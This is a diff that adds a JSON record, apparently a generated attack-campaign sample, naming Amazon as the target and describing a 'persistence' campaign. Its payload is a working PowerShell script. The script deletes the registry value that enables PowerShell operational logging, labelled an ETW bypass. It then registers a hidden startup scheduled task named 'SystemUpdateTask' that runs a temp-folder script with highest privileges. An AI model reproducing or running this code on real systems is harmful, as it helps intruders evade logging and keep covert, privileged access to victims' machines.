@@ -1,0 +1,11 @@
+{
+  "organization": "Amazon",
+  "campaign_type": "persistence",
+  "evasion_techniques": [
+    "string_obfuscation",
+    "etw_bypass"
+  ],
+  "payload": "# YLVY6AJ4DD6Znq4gKjKu\n# Generated: 2025-11-03T12:20:52.710644\n# System: Huf1GPdy0F9Ptzg\n# Process: TaoYQYHNJkn8\n\n\n# ETW Bypass via Registry\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winevt\\Channels\\Microsoft-Windows-PowerShell/Operational\" -Name \"Enabled\" -ErrorAction SilentlyContinue\n\n\n\n# Persistence via scheduled task\n$taskName = \"SystemUpdateTask\"\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1\"\n$trigger = New-ScheduledTaskTrigger -AtStartup\n$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n\nRegister-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force\n",
+  "generated_at": "2025-11-03T12:20:52.710652",
+  "signature": "a4377609982a7d7b7be42801ac95f38bd5b7fa2bb4da9243a13abef9a287a1c2"
+}
